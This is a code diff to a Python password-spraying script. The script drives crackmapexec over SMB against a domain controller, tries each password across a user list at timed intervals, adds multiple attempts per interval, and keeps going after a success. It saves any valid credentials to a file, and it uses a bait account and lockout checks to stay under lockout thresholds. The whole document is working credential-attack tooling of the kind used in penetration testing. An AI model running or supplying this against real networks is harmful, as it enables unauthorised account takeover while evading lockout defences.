@@ -10,18 +10,19 @@ GREEN = "\033[92m"
 RED = "\033[91m"
 PURPLE = "\033[95m"
 RESET = "\033[0m"
+
 BAIT_PASSWORD = "Wr0n6P@S5w0rd"
 
 def parse_args():
-    p = argparse.ArgumentParser(description="Interval password spray via CME (1 password every N minutes)")
+    p = argparse.ArgumentParser(description="Interval password spray via CME (with bait user & multiple attempts per interval)")
     p.add_argument('--dc-ip', required=True, help="Domain controller IP for crackmapexec")
     p.add_argument('-u', '--users', required=True, type=Path, help="File with one username per line")
     p.add_argument('-p', '--passwords', required=True, type=Path, help="File with one password per line")
     p.add_argument('-i', '--interval', required=True, type=int, help="Interval in minutes between password sprays")
     p.add_argument('-f', '--outfile', required=True, type=Path, help="File to append all CME output to")
-    p.add_argument('-bu', '--bait-user', required=False, help="Bait user to spray with invalid password before each main spray")
+    p.add_argument('-bu', '--bait-user', required=False, help="Bait user to spray with invalid password before each interval")
+    p.add_argument('-a', '--attempts', default=1, type=int, help="Number of spray attempts per interval (default: 1)")
     return p.parse_args()
-
 
 def load_list(path: Path):
     if not path.is_file():
@@ -29,20 +30,24 @@ def load_list(path: Path):
         sys.exit(1)
     return [line.strip() for line in path.read_text().splitlines() if line.strip()]
 
-
 def spray_password(dc_ip, users_file, password, outfile):
     cmd = [
         'crackmapexec', 'smb', dc_ip,
         '-u', str(users_file),
-        '-p', password
+        '-p', password,
+        '--continue-on-success'
     ]
     result = subprocess.run(cmd, capture_output=True, text=True)
     output = result.stdout + result.stderr
+
+    if not output.strip():
+        print(f"{RED}[!] Empty response from CME. Possible DC connection issue with {dc_ip}.{RESET}")
+        sys.exit(1)
+
     with open(outfile, 'a') as f:
         f.write(f"\n=== [{time.strftime('%Y-%m-%d %H:%M:%S')}] password: {password} ===\n")
         f.write(output)
     return output
-
 
 def spray_bait_user(dc_ip, bait_user, outfile):
     bait_file = Path(".bait_user.tmp")
@@ -51,7 +56,6 @@ def spray_bait_user(dc_ip, bait_user, outfile):
     output = spray_password(dc_ip, bait_file, BAIT_PASSWORD, outfile)
     bait_file.unlink()
     return output
-
 
 def check_lockouts(out, users):
     locked = set()
@@ -65,7 +69,6 @@ def check_lockouts(out, users):
                         locked.add(username)
     return locked
 
-
 def check_valid_creds(out, users):
     valid_creds = []
     for line in out.splitlines():
@@ -77,7 +80,6 @@ def check_valid_creds(out, users):
                     if username in users:
                         valid_creds.append(token)
     return valid_creds
-
 
 def check_disabled_or_expired(out, users):
     flagged = {}
@@ -92,19 +94,22 @@ def check_disabled_or_expired(out, users):
                             flagged[username] = status
     return flagged
 
-
 def main():
     args = parse_args()
     interval_seconds = args.interval * 60
     users = load_list(args.users)
     passwords = load_list(args.passwords)
+
     print(f"[+] Loaded {len(users)} users and {len(passwords)} passwords.")
     print(f"[+] Interval: {args.interval} minute(s)")
+    print(f"[+] Attempts per interval: {args.attempts}")
     print(f"[+] Logging to {args.outfile}")
     if args.bait_user:
-    	print("\033[1;33m[!] Make sure to add the bait user to the top of users list as well.\033[0m")
+        print("\033[1;33m[!] Make sure to add the bait user to the top of users list as well.\033[0m")
 
-    for pwd in passwords:
+    # Spray multiple unique passwords per interval, based on --attempts
+    for i in range(0, len(passwords), args.attempts):
+        attempt_passwords = passwords[i:i + args.attempts]
 
         # Spray bait user first if configured
         if args.bait_user:
@@ -115,37 +120,42 @@ def main():
                 print(f"{RED}[!] Halting spray due to bait user lockout.{RESET}")
                 sys.exit(0)
 
-        print(f"[>] Spraying password: {pwd}")
-        out = spray_password(args.dc_ip, args.users, pwd, args.outfile)
+        # Perform spray attempts using unique passwords in this interval
+        for attempt, pwd in enumerate(attempt_passwords):
+            print(f"[>] Spraying password: {pwd} (Attempt {attempt + 1}/{len(attempt_passwords)})")
+            out = spray_password(args.dc_ip, args.users, pwd, args.outfile)
 
-        # Valid credentials
-        valid_creds = check_valid_creds(out, users)
-        for cred in valid_creds:
-            print(f"{GREEN}[+] Valid credentials: {cred}{RESET}")
-            with open('valid_credentials.txt', 'a') as vf:
-                vf.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} {cred}\n")
+            # Valid credentials
+            valid_creds = check_valid_creds(out, users)
+            for cred in valid_creds:
+                print(f"{GREEN}[+] Valid credentials: {cred}{RESET}")
+                with open('valid_credentials.txt', 'a') as vf:
+                    vf.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} {cred}\n")
 
-        # Disabled or expired accounts
-        flagged = check_disabled_or_expired(out, users)
-        if flagged:
-            print(f"{PURPLE}[!] Disabled or expired accounts detected:{RESET}")
-            for user, reason in flagged.items():
-                print(f"{PURPLE}    - {user} ({reason}){RESET}")
+            # Disabled or expired accounts
+            flagged = check_disabled_or_expired(out, users)
+            if flagged:
+                print(f"{PURPLE}[!] Disabled or expired accounts detected:{RESET}")
+                for user, reason in flagged.items():
+                    print(f"{PURPLE}    - {user} ({reason}){RESET}")
 
-        # Lockouts
-        locked = check_lockouts(out, users)
-        if locked:
-            print(f"{RED}[!] Detected account lockout for:{RESET}")
-            for u in locked:
-                print(f"{RED}    - {u}{RESET}")
-            print(f"{RED}[!] Halting spray due to lockouts.{RESET}")
-            sys.exit(0)
+            # Lockouts
+            locked = check_lockouts(out, users)
+            if locked:
+                print(f"{RED}[!] Detected account lockout for:{RESET}")
+                for u in locked:
+                    print(f"{RED}    - {u}{RESET}")
+                print(f"{RED}[!] Halting spray due to lockouts.{RESET}")
+                sys.exit(0)
 
+            if attempt < len(attempt_passwords) - 1:
+                time.sleep(3)
+
+        # Sleep before next interval
         print(f"[+] Sleeping for {args.interval} minute(s)...")
         time.sleep(interval_seconds)
 
     print("[+] Finished spraying all passwords without lockouts.")
-
 
 if __name__ == '__main__':
     main()
